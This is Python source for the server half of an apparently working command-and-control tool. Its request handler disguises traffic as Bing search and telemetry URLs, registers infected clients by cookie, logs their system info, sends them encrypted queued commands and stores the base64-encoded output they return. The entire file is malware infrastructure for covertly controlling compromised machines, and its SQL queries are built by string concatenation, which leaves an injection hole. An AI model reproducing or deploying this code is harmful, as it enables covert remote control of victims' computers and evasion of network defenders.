import socketserver
import threading
import time
import base64
from Conf import *
from threading import *
class My_Http_TCPHandler(socketserver.BaseRequestHandler):
    def Get_Send_Cmd(self,Pid):
        sql="Select Send_Cmd from Clinet_Data where Agree='http' and Wan='"+self.client_address[0]+"' and Pid='"+Pid+"';"
        #print(sql)
        Send_Cmd=self.Sqlit_Conn_DB.Clinet_Conn_Select(sql)[0]
        #print(Send_Cmd)
        return Send_Cmd[0]

    def handle(self):
        try:
            while True:
                self.data=self.request.recv(1024)
                if not self.data:
                    break
                #print(self.data.decode())
                Return_Data=self.My_Request_Handle.Set_Data()

                if("GET / HTTP/" in self.data.decode()):
                    Return_Data=self.My_Request_Handle.Set_Data()
                    if("Cookie:" in self.data.decode()):
                        if(self.My_Request_Handle.Cookie_Handle(self.data.decode())):
                            Set_Online="Go_Online"
                            Return_Data=self.My_Request_Handle.Set_Data(Cookie_Cheak=Set_Online)
                            self.request.sendall(Return_Data)
                    else:
                        Return_Data=self.My_Request_Handle.Set_Data()
                        self.request.sendall(Return_Data)

                if('POST /fd/ls/lsp.aspx HTTP/1.1' in self.data.decode()):
                    if("Cookie:" in self.data.decode()):
                        if(self.My_Request_Handle.Cookie_Handle(self.data.decode())):
                            Systeminfo=self.My_Request_Handle.Get_Cline_Data(self.data.decode())
                            Conn_Data=self.client_address[0]+","+Systeminfo
                            Conn_Time=time.time()
                            Conn_Data="http,"+Conn_Data+","+str(Conn_Time)
                            Conn_Data=Conn_Data.split(",")
                            self.Sqlit_Conn_DB.Clinet_Conn_Insert(Conn_Data)
                            with open("Log/Up_Conn.log","a+") as f:
                                f.write(self.client_address[0]+":Online success\n")
                            #self.request.sendall(Return_Data)


                if("GET /search?q=" in self.data.decode()):
                    #print(self.data.decode())
                    if("Cookie:" in self.data.decode()):
                        if(self.My_Request_Handle.Cookie_Handle(self.data.decode())):
                            Pid=self.My_Request_Handle.Get_Clinet_Pid(self.data.decode())
                            self.Sqlit_Conn_DB.Clinet_Conn_Time_UpDate('http',self.client_address[0],Pid)
                            Send_Cmd=self.Get_Send_Cmd(str(Pid))
                            if(Send_Cmd!=None and len(Send_Cmd)>0):
                                #print(11)
                                Data=self.My_Request_Handle.Data_Encrypt(Send_Cmd)
                                Data_Len=len(Data)
                                Return_Data=self.My_Request_Handle.Set_Data(Cookie_Cheak="Go_Speeck",Data=Data,LenData=str(168+Data_Len))
                                self.request.sendall(Return_Data)
                            else:
                                Return_Data=self.My_Request_Handle.Set_Data()
                                self.request.sendall(Return_Data)

                if('POST /fd/ls/GLinkPingPost.aspx?q=' in self.data.decode()):
                    Exect_Data=self.data.decode()
                    #print(self.data)
                    if("Cookie:" in Exect_Data):
                        if(self.My_Request_Handle.Cookie_Handle(Exect_Data)):
                            while(1):
                                if(Exect_Data[-4:]=="</T>"):
                                    break
                                self.data=self.request.recv(1024)
                                Exect_Data=Exect_Data+self.data.decode()
                            Return_Cmd=self.My_Request_Handle.Get_Cline_Data(Exect_Data)
                            Pid=self.My_Request_Handle.Get_Clinet_Pid(Exect_Data)
                            #print(Return_Cmd)
                            Return_Cmd=base64.b64decode(Return_Cmd)
                            #print(Return_Cmd)
                            self.Sqlit_Conn_DB.Clinet_Conn_Return_Cmd_Update(Return_Cmd.decode(),'http',self.client_address[0],Pid)
                            self.Sqlit_Conn_DB.Clinet_Conn_Snd_Cmd_Update("NULL",'http',self.client_address[0],Pid)
                        else:
                            Return_Data=self.My_Request_Handle.Set_Data()
                            self.request.sendall(Return_Data)
                            
            
        except Exception as e:
            print(e)
            #print(self.client_address,"连接断开")
        finally:
            self.request.close()
    def setup(self):
        self.Sqlit_Conn_DB=Clinet_Data_Storage()
        self.My_Request_Handle=Request_Handle()
        #print("before handle,连接建立：",self.client_address)
    def finish(self):
        pass
        #print("finish run  after handle")